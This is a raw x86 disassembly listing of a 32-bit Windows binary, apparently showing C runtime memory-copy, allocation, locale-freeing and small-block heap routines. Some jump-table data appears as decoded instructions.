  42610b:	cmp    ecx,0x8
  42610e:	jb     0x4260dc
  426110:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426112:	jmp    DWORD PTR [edx*4+0x4261cc]
  426119:	lea    ecx,[ecx+0x0]
  42611c:	and    edx,ecx
  42611e:	mov    al,BYTE PTR [esi]
  426120:	mov    BYTE PTR [edi],al
  426122:	mov    al,BYTE PTR [esi+0x1]
  426125:	shr    ecx,0x2
  426128:	mov    BYTE PTR [edi+0x1],al
  42612b:	add    esi,0x2
  42612e:	add    edi,0x2
  426131:	cmp    ecx,0x8
  426134:	jb     0x4260dc
  426136:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426138:	jmp    DWORD PTR [edx*4+0x4261cc]
  42613f:	nop
  426140:	and    edx,ecx
  426142:	mov    al,BYTE PTR [esi]
  426144:	mov    BYTE PTR [edi],al
  426146:	add    esi,0x1
  426149:	shr    ecx,0x2
  42614c:	add    edi,0x1
  42614f:	cmp    ecx,0x8
  426152:	jb     0x4260dc
  426154:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426156:	jmp    DWORD PTR [edx*4+0x4261cc]
  42615d:	lea    ecx,[ecx+0x0]
  426160:	ret    
  426161:	popa   
  426162:	inc    edx
  426163:	add    BYTE PTR [eax-0x57ffbd9f],dh
  426169:	popa   
  42616a:	inc    edx
  42616b:	add    BYTE PTR [eax-0x67ffbd9f],ah
  426171:	popa   
  426172:	inc    edx
  426173:	add    BYTE PTR [eax-0x77ffbd9f],dl
  426179:	popa   
  42617a:	inc    edx
  42617b:	add    BYTE PTR [eax-0x74ffbd9f],al
  426181:	inc    esp
  426182:	mov    fs,esp
  426184:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426188:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42618c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426190:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426194:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426198:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42619c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261b8:	lea    eax,[ecx*4+0x0]
  4261bf:	add    esi,eax
  4261c1:	add    edi,eax
  4261c3:	jmp    DWORD PTR [edx*4+0x4261cc]
  4261ca:	mov    edi,edi
  4261cc:	fsub   QWORD PTR [ecx+0x42]
  4261cf:	add    ah,ah
  4261d1:	popa   
  4261d2:	inc    edx
  4261d3:	add    al,dh
  4261d5:	popa   
  4261d6:	inc    edx
  4261d7:	add    BYTE PTR [edx+eiz*2],al
  4261da:	inc    edx
  4261db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261e1:	leave  
  4261e2:	ret    
  4261e3:	nop
  4261e4:	mov    al,BYTE PTR [esi]
  4261e6:	mov    BYTE PTR [edi],al
  4261e8:	mov    eax,DWORD PTR [ebp+0x8]
  4261eb:	pop    esi
  4261ec:	pop    edi
  4261ed:	leave  
  4261ee:	ret    
  4261ef:	nop
  4261f0:	mov    al,BYTE PTR [esi]
  4261f2:	mov    BYTE PTR [edi],al
  4261f4:	mov    al,BYTE PTR [esi+0x1]
  4261f7:	mov    BYTE PTR [edi+0x1],al
  4261fa:	mov    eax,DWORD PTR [ebp+0x8]
  4261fd:	pop    esi
  4261fe:	pop    edi
  4261ff:	leave  
  426200:	ret    
  426201:	lea    ecx,[ecx+0x0]
  426204:	mov    al,BYTE PTR [esi]
  426206:	mov    BYTE PTR [edi],al
  426208:	mov    al,BYTE PTR [esi+0x1]
  42620b:	mov    BYTE PTR [edi+0x1],al
  42620e:	mov    al,BYTE PTR [esi+0x2]
  426211:	mov    BYTE PTR [edi+0x2],al
  426214:	mov    eax,DWORD PTR [ebp+0x8]
  426217:	pop    esi
  426218:	pop    edi
  426219:	leave  
  42621a:	ret    
  42621b:	nop
  42621c:	lea    esi,[ecx+esi*1-0x4]
  426220:	lea    edi,[ecx+edi*1-0x4]
  426224:	test   edi,0x3
  42622a:	jne    0x426250
  42622c:	shr    ecx,0x2
  42622f:	and    edx,0x3
  426232:	cmp    ecx,0x8
  426235:	jb     0x426244
  426237:	std    
  426238:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42623a:	cld    
  42623b:	jmp    DWORD PTR [edx*4+0x426368]
  426242:	mov    edi,edi
  426244:	neg    ecx
  426246:	jmp    DWORD PTR [ecx*4+0x426318]
  42624d:	lea    ecx,[ecx+0x0]
  426250:	mov    eax,edi
  426252:	mov    edx,0x3
  426257:	cmp    ecx,0x4
  42625a:	jb     0x426268
  42625c:	and    eax,0x3
  42625f:	sub    ecx,eax
  426261:	jmp    DWORD PTR [eax*4+0x42626c]
  426268:	jmp    DWORD PTR [ecx*4+0x426368]
  42626f:	nop
  426270:	jl     0x4262d4
  426272:	inc    edx
  426273:	add    BYTE PTR [eax-0x37ffbd9e],ah
  426279:	bound  eax,QWORD PTR [edx+0x0]
  42627c:	mov    al,BYTE PTR [esi+0x3]
  42627f:	and    edx,ecx
  426281:	mov    BYTE PTR [edi+0x3],al
  426284:	sub    esi,0x1
  426287:	shr    ecx,0x2
  42628a:	sub    edi,0x1
  42628d:	cmp    ecx,0x8
  426290:	jb     0x426244
  426292:	std    
  426293:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426295:	cld    
  426296:	jmp    DWORD PTR [edx*4+0x426368]
  42629d:	lea    ecx,[ecx+0x0]
  4262a0:	mov    al,BYTE PTR [esi+0x3]
  4262a3:	and    edx,ecx
  4262a5:	mov    BYTE PTR [edi+0x3],al
  4262a8:	mov    al,BYTE PTR [esi+0x2]
  4262ab:	shr    ecx,0x2
  4262ae:	mov    BYTE PTR [edi+0x2],al
  4262b1:	sub    esi,0x2
  4262b4:	sub    edi,0x2
  4262b7:	cmp    ecx,0x8
  4262ba:	jb     0x426244
  4262bc:	std    
  4262bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262bf:	cld    
  4262c0:	jmp    DWORD PTR [edx*4+0x426368]
  4262c7:	nop
  4262c8:	mov    al,BYTE PTR [esi+0x3]
  4262cb:	and    edx,ecx
  4262cd:	mov    BYTE PTR [edi+0x3],al
  4262d0:	mov    al,BYTE PTR [esi+0x2]
  4262d3:	mov    BYTE PTR [edi+0x2],al
  4262d6:	mov    al,BYTE PTR [esi+0x1]
  4262d9:	shr    ecx,0x2
  4262dc:	mov    BYTE PTR [edi+0x1],al
  4262df:	sub    esi,0x3
  4262e2:	sub    edi,0x3
  4262e5:	cmp    ecx,0x8
  4262e8:	jb     0x426244
  4262ee:	std    
  4262ef:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262f1:	cld    
  4262f2:	jmp    DWORD PTR [edx*4+0x426368]
  4262f9:	lea    ecx,[ecx+0x0]
  4262fc:	sbb    al,0x63
  4262fe:	inc    edx
  4262ff:	add    BYTE PTR [ebx+eiz*2],ah
  426302:	inc    edx
  426303:	add    BYTE PTR [ebx+eiz*2],ch
  426306:	inc    edx
  426307:	add    BYTE PTR [ebx+eiz*2],dh
  42630a:	inc    edx
  42630b:	add    BYTE PTR [ebx+eiz*2],bh
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2+0x42],al
  426313:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  426317:	add    BYTE PTR [edi+0x63],bl
  42631a:	inc    edx
  42631b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426321:	inc    esp
  426322:	(bad)  
  426323:	sbb    al,0x8b
  426325:	inc    esp
  426326:	mov    ds,WORD PTR [eax]
  426328:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42632c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426330:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426334:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426338:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426340:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426348:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426350:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426354:	lea    eax,[ecx*4+0x0]
  42635b:	add    esi,eax
  42635d:	add    edi,eax
  42635f:	jmp    DWORD PTR [edx*4+0x426368]
  426366:	mov    edi,edi
  426368:	js     0x4263cd
  42636a:	inc    edx
  42636b:	add    BYTE PTR [eax-0x6fffbd9d],al
  426371:	arpl   WORD PTR [edx+0x0],ax
  426374:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426375:	arpl   WORD PTR [edx+0x0],ax
  426378:	mov    eax,DWORD PTR [ebp+0x8]
  42637b:	pop    esi
  42637c:	pop    edi
  42637d:	leave  
  42637e:	ret    
  42637f:	nop
  426380:	mov    al,BYTE PTR [esi+0x3]
  426383:	mov    BYTE PTR [edi+0x3],al
  426386:	mov    eax,DWORD PTR [ebp+0x8]
  426389:	pop    esi
  42638a:	pop    edi
  42638b:	leave  
  42638c:	ret    
  42638d:	lea    ecx,[ecx+0x0]
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    al,BYTE PTR [esi+0x2]
  426399:	mov    BYTE PTR [edi+0x2],al
  42639c:	mov    eax,DWORD PTR [ebp+0x8]
  42639f:	pop    esi
  4263a0:	pop    edi
  4263a1:	leave  
  4263a2:	ret    
  4263a3:	nop
  4263a4:	mov    al,BYTE PTR [esi+0x3]
  4263a7:	mov    BYTE PTR [edi+0x3],al
  4263aa:	mov    al,BYTE PTR [esi+0x2]
  4263ad:	mov    BYTE PTR [edi+0x2],al
  4263b0:	mov    al,BYTE PTR [esi+0x1]
  4263b3:	mov    BYTE PTR [edi+0x1],al
  4263b6:	mov    eax,DWORD PTR [ebp+0x8]
  4263b9:	pop    esi
  4263ba:	pop    edi
  4263bb:	leave  
  4263bc:	ret    
  4263bd:	push   DWORD PTR [esp+0x4]
  4263c1:	call   DWORD PTR ds:0x4290c8
  4263c7:	xor    eax,eax
  4263c9:	inc    eax
  4263ca:	ret    0x8
  4263cd:	push   0x10
  4263cf:	push   0x4296c8
  4263d4:	call   0x425340
  4263d9:	mov    eax,ds:0x45dd88
  4263de:	test   eax,eax
  4263e0:	jne    0x426419
  4263e2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263e9:	je     0x42640f
  4263eb:	push   0x4296b4
  4263f0:	call   DWORD PTR ds:0x429024
  4263f6:	test   eax,eax
  4263f8:	je     0x42640f
  4263fa:	push   0x42968c
  4263ff:	push   eax
  426400:	call   DWORD PTR ds:0x429020
  426406:	mov    ds:0x45dd88,eax
  42640b:	test   eax,eax
  42640d:	jne    0x426419
  42640f:	mov    eax,0x4263bd
  426414:	mov    ds:0x45dd88,eax
  426419:	and    DWORD PTR [ebp-0x4],0x0
  42641d:	push   DWORD PTR [ebp+0xc]
  426420:	push   DWORD PTR [ebp+0x8]
  426423:	call   eax
  426425:	mov    DWORD PTR [ebp-0x1c],eax
  426428:	jmp    0x42644e
  42642a:	mov    eax,DWORD PTR [ebp-0x14]
  42642d:	mov    eax,DWORD PTR [eax]
  42642f:	mov    eax,DWORD PTR [eax]
  426431:	mov    DWORD PTR [ebp-0x20],eax
  426434:	xor    eax,eax
  426436:	inc    eax
  426437:	ret    
  426438:	mov    esp,DWORD PTR [ebp-0x18]
  42643b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426442:	jne    0x42644c
  426444:	push   0x8
  426446:	call   DWORD PTR ds:0x429094
  42644c:	xor    eax,eax
  42644e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426452:	call   0x42537b
  426457:	ret    
  426458:	push   0x10
  42645a:	push   0x4296d8
  42645f:	call   0x425340
  426464:	mov    esi,DWORD PTR [ebp+0x8]
  426467:	imul   esi,DWORD PTR [ebp+0xc]
  42646b:	mov    DWORD PTR [ebp-0x1c],esi
  42646e:	test   esi,esi
  426470:	jne    0x426473
  426472:	inc    esi
  426473:	xor    edi,edi
  426475:	mov    DWORD PTR [ebp-0x20],edi
  426478:	cmp    esi,0xffffffe0
  42647b:	ja     0x4264e2
  42647d:	cmp    DWORD PTR ds:0x45e144,0x3
  426484:	jne    0x4264cd
  426486:	add    esi,0xf
  426489:	and    esi,0xfffffff0
  42648c:	mov    DWORD PTR [ebp+0xc],esi
  42648f:	mov    ebx,DWORD PTR [ebp-0x1c]
  426492:	cmp    ebx,DWORD PTR ds:0x45df04
  426498:	ja     0x4264cd
  42649a:	push   0x4
  42649c:	call   0x4254ff
  4264a1:	pop    ecx
  4264a2:	and    DWORD PTR [ebp-0x4],edi
  4264a5:	push   ebx
  4264a6:	call   0x426f01
  4264ab:	pop    ecx
  4264ac:	mov    DWORD PTR [ebp-0x20],eax
  4264af:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264b3:	call   0x426502
  4264b8:	mov    edi,DWORD PTR [ebp-0x20]
  4264bb:	test   edi,edi
  4264bd:	je     0x4264d1
  4264bf:	push   DWORD PTR [ebp-0x1c]
  4264c2:	push   0x0
  4264c4:	push   edi
  4264c5:	call   0x427c40
  4264ca:	add    esp,0xc
  4264cd:	test   edi,edi
  4264cf:	jne    0x42650b
  4264d1:	push   esi
  4264d2:	push   0x8
  4264d4:	push   DWORD PTR ds:0x45e140
  4264da:	call   DWORD PTR ds:0x429030
  4264e0:	mov    edi,eax
  4264e2:	test   edi,edi
  4264e4:	jne    0x42650b
  4264e6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264ec:	je     0x42650b
  4264ee:	push   esi
  4264ef:	call   0x427c22
  4264f4:	pop    ecx
  4264f5:	test   eax,eax
  4264f7:	jne    0x426473
  4264fd:	jmp    0x42650d
  4264ff:	mov    esi,DWORD PTR [ebp+0xc]
  426502:	push   0x4
  426504:	call   0x42546b
  426509:	pop    ecx
  42650a:	ret    
  42650b:	mov    eax,edi
  42650d:	call   0x42537b
  426512:	ret    
  426513:	push   esi
  426514:	mov    esi,DWORD PTR [esp+0x8]
  426518:	mov    eax,DWORD PTR [esi+0x3c]
  42651b:	push   edi
  42651c:	xor    edi,edi
  42651e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426524:	je     0x426589
  426526:	cmp    eax,edi
  426528:	je     0x426589
  42652a:	mov    eax,DWORD PTR [esi+0x2c]
  42652d:	cmp    DWORD PTR [eax],edi
  42652f:	jne    0x426589
  426531:	mov    eax,DWORD PTR [esi+0x34]
  426534:	cmp    eax,edi
  426536:	je     0x426554
  426538:	cmp    DWORD PTR [eax],edi
  42653a:	jne    0x426554
  42653c:	cmp    eax,DWORD PTR ds:0x45def0
  426542:	je     0x426554
  426544:	push   eax
  426545:	call   0x425f4a
  42654a:	push   DWORD PTR [esi+0x3c]
  42654d:	call   0x427e8f
  426552:	pop    ecx
  426553:	pop    ecx
  426554:	mov    eax,DWORD PTR [esi+0x30]
  426557:	cmp    eax,edi
  426559:	je     0x426577
  42655b:	cmp    DWORD PTR [eax],edi
  42655d:	jne    0x426577
  42655f:	cmp    eax,DWORD PTR ds:0x45def4
  426565:	je     0x426577
  426567:	push   eax
  426568:	call   0x425f4a
  42656d:	push   DWORD PTR [esi+0x3c]
  426570:	call   0x427e30
  426575:	pop    ecx
  426576:	pop    ecx
  426577:	push   DWORD PTR [esi+0x2c]
  42657a:	call   0x425f4a
  42657f:	push   DWORD PTR [esi+0x3c]
  426582:	call   0x425f4a
  426587:	pop    ecx
  426588:	pop    ecx
  426589:	mov    eax,DWORD PTR [esi+0x40]
  42658c:	cmp    eax,DWORD PTR ds:0x45deec
  426592:	je     0x4265ac
  426594:	cmp    eax,edi
  426596:	je     0x4265ac
  426598:	cmp    DWORD PTR [eax],edi
  42659a:	jne    0x4265ac
  42659c:	push   eax
  42659d:	call   0x425f4a
  4265a2:	push   DWORD PTR [esi+0x44]
  4265a5:	call   0x425f4a
  4265aa:	pop    ecx
  4265ab:	pop    ecx
  4265ac:	mov    eax,DWORD PTR [esi+0x50]
  4265af:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265b5:	je     0x4265d3
  4265b7:	cmp    eax,edi
  4265b9:	je     0x4265d3
  4265bb:	cmp    DWORD PTR [eax+0xb4],edi
  4265c1:	jne    0x4265d3
  4265c3:	push   eax
  4265c4:	call   0x427ca0
  4265c9:	push   DWORD PTR [esi+0x50]
  4265cc:	call   0x425f4a
  4265d1:	pop    ecx
  4265d2:	pop    ecx
  4265d3:	push   esi
  4265d4:	call   0x425f4a
  4265d9:	pop    ecx
  4265da:	pop    edi
  4265db:	pop    esi
  4265dc:	ret    
  4265dd:	push   esi
  4265de:	call   0x4251f3
  4265e3:	mov    esi,eax
  4265e5:	mov    eax,DWORD PTR [esi+0x64]
  4265e8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265ee:	je     0x42669a
  4265f4:	test   eax,eax
  4265f6:	je     0x426627
  4265f8:	mov    ecx,DWORD PTR [eax+0x2c]
  4265fb:	dec    DWORD PTR [eax]
  4265fd:	test   ecx,ecx
  4265ff:	je     0x426603
  426601:	dec    DWORD PTR [ecx]
  426603:	mov    ecx,DWORD PTR [eax+0x34]
  426606:	test   ecx,ecx
  426608:	je     0x42660c
  42660a:	dec    DWORD PTR [ecx]
  42660c:	mov    ecx,DWORD PTR [eax+0x30]
  42660f:	test   ecx,ecx
  426611:	je     0x426615
  426613:	dec    DWORD PTR [ecx]
  426615:	mov    ecx,DWORD PTR [eax+0x40]
  426618:	test   ecx,ecx
  42661a:	je     0x42661e
  42661c:	dec    DWORD PTR [ecx]
  42661e:	mov    ecx,DWORD PTR [eax+0x4c]
  426621:	dec    DWORD PTR [ecx+0xb4]
  426627:	mov    ecx,DWORD PTR ds:0x45d58c
  42662d:	mov    DWORD PTR [esi+0x64],ecx
  426630:	mov    ecx,DWORD PTR ds:0x45d58c
  426636:	inc    DWORD PTR [ecx]
  426638:	mov    ecx,DWORD PTR ds:0x45d58c
  42663e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426641:	test   ecx,ecx
  426643:	je     0x426647
  426645:	inc    DWORD PTR [ecx]
  426647:	mov    ecx,DWORD PTR ds:0x45d58c
  42664d:	mov    ecx,DWORD PTR [ecx+0x34]
  426650:	test   ecx,ecx
  426652:	je     0x426656
  426654:	inc    DWORD PTR [ecx]
  426656:	mov    ecx,DWORD PTR ds:0x45d58c
  42665c:	mov    ecx,DWORD PTR [ecx+0x30]
  42665f:	test   ecx,ecx
  426661:	je     0x426665
  426663:	inc    DWORD PTR [ecx]
  426665:	mov    ecx,DWORD PTR ds:0x45d58c
  42666b:	mov    ecx,DWORD PTR [ecx+0x40]
  42666e:	test   ecx,ecx
  426670:	je     0x426674
  426672:	inc    DWORD PTR [ecx]
  426674:	mov    ecx,DWORD PTR ds:0x45d58c
  42667a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42667d:	inc    DWORD PTR [ecx+0xb4]
  426683:	test   eax,eax
  426685:	je     0x42669a
  426687:	cmp    DWORD PTR [eax],0x0
  42668a:	jne    0x42669a
  42668c:	cmp    eax,0x45d538
  426691:	je     0x42669a
  426693:	push   eax
  426694:	call   0x426513
  426699:	pop    ecx
  42669a:	mov    eax,DWORD PTR [esi+0x64]
  42669d:	pop    esi
  42669e:	ret    
  42669f:	push   0xc
  4266a1:	push   0x429868
  4266a6:	call   0x425340
  4266ab:	push   0xc
  4266ad:	call   0x4254ff
  4266b2:	pop    ecx
  4266b3:	and    DWORD PTR [ebp-0x4],0x0
  4266b7:	call   0x4265dd
  4266bc:	mov    DWORD PTR [ebp-0x1c],eax
  4266bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4266c3:	call   0x4266d1
  4266c8:	mov    eax,DWORD PTR [ebp-0x1c]
  4266cb:	call   0x42537b
  4266d0:	ret    
  4266d1:	push   0xc
  4266d3:	call   0x42546b
  4266d8:	pop    ecx
  4266d9:	ret    
  4266da:	push   0x140
  4266df:	push   0x0
  4266e1:	push   DWORD PTR ds:0x45e140
  4266e7:	call   DWORD PTR ds:0x429030
  4266ed:	test   eax,eax
  4266ef:	mov    ds:0x45df00,eax
  4266f4:	jne    0x4266f7
  4266f6:	ret    
  4266f7:	mov    ecx,DWORD PTR [esp+0x4]
  4266fb:	and    DWORD PTR ds:0x45def8,0x0
  426702:	and    DWORD PTR ds:0x45defc,0x0
  426709:	mov    ds:0x45df08,eax
  42670e:	xor    eax,eax
  426710:	mov    DWORD PTR ds:0x45df04,ecx
  426716:	mov    DWORD PTR ds:0x45df0c,0x10
  426720:	inc    eax
  426721:	ret    
  426722:	mov    eax,ds:0x45defc
  426727:	lea    ecx,[eax+eax*4]
  42672a:	mov    eax,ds:0x45df00
  42672f:	lea    ecx,[eax+ecx*4]
  426732:	jmp    0x426746
  426734:	mov    edx,DWORD PTR [esp+0x4]
  426738:	sub    edx,DWORD PTR [eax+0xc]
  42673b:	cmp    edx,0x100000
  426741:	jb     0x42674c
  426743:	add    eax,0x14
  426746:	cmp    eax,ecx
  426748:	jb     0x426734
  42674a:	xor    eax,eax
  42674c:	ret    
  42674d:	push   ebp
  42674e:	mov    ebp,esp
  426750:	sub    esp,0x10
  426753:	mov    ecx,DWORD PTR [ebp+0x8]
  426756:	mov    eax,DWORD PTR [ecx+0x10]
  426759:	push   esi
  42675a:	mov    esi,DWORD PTR [ebp+0xc]
  42675d:	push   edi
  42675e:	mov    edi,esi
  426760:	sub    edi,DWORD PTR [ecx+0xc]
  426763:	add    esi,0xfffffffc
  426766:	shr    edi,0xf
  426769:	mov    ecx,edi
  42676b:	imul   ecx,ecx,0x204
  426771:	lea    ecx,[ecx+eax*1+0x144]
  426778:	mov    DWORD PTR [ebp-0x10],ecx
  42677b:	mov    ecx,DWORD PTR [esi]
  42677d:	dec    ecx
  42677e:	test   cl,0x1
  426781:	mov    DWORD PTR [ebp-0x4],ecx
  426784:	jne    0x426a61
  42678a:	push   ebx
  42678b:	lea    ebx,[ecx+esi*1]
  42678e:	mov    edx,DWORD PTR [ebx]
  426790:	mov    DWORD PTR [ebp-0xc],edx
  426793:	mov    edx,DWORD PTR [esi-0x4]
  426796:	mov    DWORD PTR [ebp-0x8],edx
  426799:	mov    edx,DWORD PTR [ebp-0xc]
  42679c:	test   dl,0x1
  42679f:	mov    DWORD PTR [ebp+0xc],ebx
  4267a2:	jne    0x426818
  4267a4:	sar    edx,0x4
  4267a7:	dec    edx
  4267a8:	cmp    edx,0x3f
  4267ab:	jbe    0x4267b0
  4267ad:	push   0x3f
  4267af:	pop    edx
  4267b0:	mov    ecx,DWORD PTR [ebx+0x4]
  4267b3:	cmp    ecx,DWORD PTR [ebx+0x8]
  4267b6:	jne    0x4267fa
  4267b8:	cmp    edx,0x20
  4267bb:	mov    ebx,0x80000000
  4267c0:	jae    0x4267db
  4267c2:	mov    ecx,edx
  4267c4:	shr    ebx,cl
  4267c6:	lea    ecx,[edx+eax*1+0x4]
  4267ca:	not    ebx
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],ebx
  4267d0:	dec    BYTE PTR [ecx]
  4267d2:	jne    0x4267f7
  4267d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d7:	and    DWORD PTR [ecx],ebx
  4267d9:	jmp    0x4267f7
  4267db:	lea    ecx,[edx-0x20]
  4267de:	shr    ebx,cl
  4267e0:	lea    ecx,[edx+eax*1+0x4]
  4267e4:	not    ebx
  4267e6:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  4267ed:	dec    BYTE PTR [ecx]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],ebx
  4267f7:	mov    ebx,DWORD PTR [ebp+0xc]
  4267fa:	mov    edx,DWORD PTR [ebx+0x8]
  4267fd:	mov    ebx,DWORD PTR [ebx+0x4]
  426800:	mov    ecx,DWORD PTR [ebp-0x4]
  426803:	add    ecx,DWORD PTR [ebp-0xc]
  426806:	mov    DWORD PTR [edx+0x4],ebx
  426809:	mov    edx,DWORD PTR [ebp+0xc]
  42680c:	mov    ebx,DWORD PTR [edx+0x4]
  42680f:	mov    edx,DWORD PTR [edx+0x8]
  426812:	mov    DWORD PTR [ebx+0x8],edx
  426815:	mov    DWORD PTR [ebp-0x4],ecx
  426818:	mov    edx,ecx
  42681a:	sar    edx,0x4
  42681d:	dec    edx
  42681e:	cmp    edx,0x3f
  426821:	jbe    0x426826
  426823:	push   0x3f
  426825:	pop    edx
  426826:	mov    ebx,DWORD PTR [ebp-0x8]
  426829:	and    ebx,0x1
  42682c:	mov    DWORD PTR [ebp-0xc],ebx
  42682f:	jne    0x4268c4
  426835:	sub    esi,DWORD PTR [ebp-0x8]
  426838:	mov    ebx,DWORD PTR [ebp-0x8]
  42683b:	sar    ebx,0x4
  42683e:	push   0x3f
  426840:	mov    DWORD PTR [ebp+0xc],esi
  426843:	dec    ebx
  426844:	pop    esi
  426845:	cmp    ebx,esi
  426847:	jbe    0x42684b
  426849:	mov    ebx,esi
  42684b:	add    ecx,DWORD PTR [ebp-0x8]
  42684e:	mov    edx,ecx
  426850:	sar    edx,0x4
  426853:	dec    edx
  426854:	cmp    edx,esi
  426856:	mov    DWORD PTR [ebp-0x4],ecx
  426859:	jbe    0x42685d
  42685b:	mov    edx,esi
  42685d:	cmp    ebx,edx
  42685f:	je     0x4268bf
  426861:	mov    ecx,DWORD PTR [ebp+0xc]
  426864:	mov    esi,DWORD PTR [ecx+0x4]
  426867:	cmp    esi,DWORD PTR [ecx+0x8]
  42686a:	jne    0x4268a7
  42686c:	cmp    ebx,0x20
  42686f:	mov    esi,0x80000000
  426874:	jae    0x42688d
  426876:	mov    ecx,ebx
  426878:	shr    esi,cl
  42687a:	not    esi
  42687c:	and    DWORD PTR [eax+edi*4+0x44],esi
  426880:	dec    BYTE PTR [ebx+eax*1+0x4]
  426884:	jne    0x4268a7
  426886:	mov    ecx,DWORD PTR [ebp+0x8]
  426889:	and    DWORD PTR [ecx],esi
  42688b:	jmp    0x4268a7
  42688d:	lea    ecx,[ebx-0x20]
  426890:	shr    esi,cl
  426892:	not    esi
  426894:	and    DWORD PTR [eax+edi*4+0xc4],esi
  42689b:	dec    BYTE PTR [ebx+eax*1+0x4]
  42689f:	jne    0x4268a7
  4268a1:	mov    ecx,DWORD PTR [ebp+0x8]
  4268a4:	and    DWORD PTR [ecx+0x4],esi
  4268a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4268aa:	mov    esi,DWORD PTR [ecx+0x8]
  4268ad:	mov    ecx,DWORD PTR [ecx+0x4]
  4268b0:	mov    DWORD PTR [esi+0x4],ecx
  4268b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4268b6:	mov    esi,DWORD PTR [ecx+0x4]
  4268b9:	mov    ecx,DWORD PTR [ecx+0x8]
  4268bc:	mov    DWORD PTR [esi+0x8],ecx
  4268bf:	mov    esi,DWORD PTR [ebp+0xc]
  4268c2:	jmp    0x4268c7
  4268c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4268c7:	cmp    DWORD PTR [ebp-0xc],0x0
  4268cb:	jne    0x4268d5
  4268cd:	cmp    ebx,edx
  4268cf:	je     0x426955
  4268d5:	mov    ecx,DWORD PTR [ebp-0x10]
  4268d8:	lea    ecx,[ecx+edx*8]
  4268db:	mov    ebx,DWORD PTR [ecx+0x4]
  4268de:	mov    DWORD PTR [esi+0x8],ecx
  4268e1:	mov    DWORD PTR [esi+0x4],ebx
  4268e4:	mov    DWORD PTR [ecx+0x4],esi
  4268e7:	mov    ecx,DWORD PTR [esi+0x4]
  4268ea:	mov    DWORD PTR [ecx+0x8],esi
  4268ed:	mov    ecx,DWORD PTR [esi+0x4]
  4268f0:	cmp    ecx,DWORD PTR [esi+0x8]
  4268f3:	jne    0x426955
  4268f5:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  4268f9:	mov    BYTE PTR [ebp+0xf],cl
  4268fc:	inc    cl
  4268fe:	cmp    edx,0x20
  426901:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426905:	jae    0x42692c
  426907:	cmp    BYTE PTR [ebp+0xf],0x0
  42690b:	jne    0x42691b
  42690d:	mov    ecx,edx
  42690f:	mov    ebx,0x80000000
  426914:	shr    ebx,cl
  426916:	mov    ecx,DWORD PTR [ebp+0x8]
  426919:	or     DWORD PTR [ecx],ebx
  42691b:	mov    ebx,0x80000000
  426920:	mov    ecx,edx
  426922:	shr    ebx,cl
  426924:	lea    eax,[eax+edi*4+0x44]
  426928:	or     DWORD PTR [eax],ebx
  42692a:	jmp    0x426955
  42692c:	cmp    BYTE PTR [ebp+0xf],0x0
  426930:	jne    0x426942
  426932:	lea    ecx,[edx-0x20]
  426935:	mov    ebx,0x80000000
  42693a:	shr    ebx,cl
  42693c:	mov    ecx,DWORD PTR [ebp+0x8]
  42693f:	or     DWORD PTR [ecx+0x4],ebx
  426942:	lea    ecx,[edx-0x20]
  426945:	mov    edx,0x80000000
  42694a:	shr    edx,cl
  42694c:	lea    eax,[eax+edi*4+0xc4]
  426953:	or     DWORD PTR [eax],edx
  426955:	mov    eax,DWORD PTR [ebp-0x4]
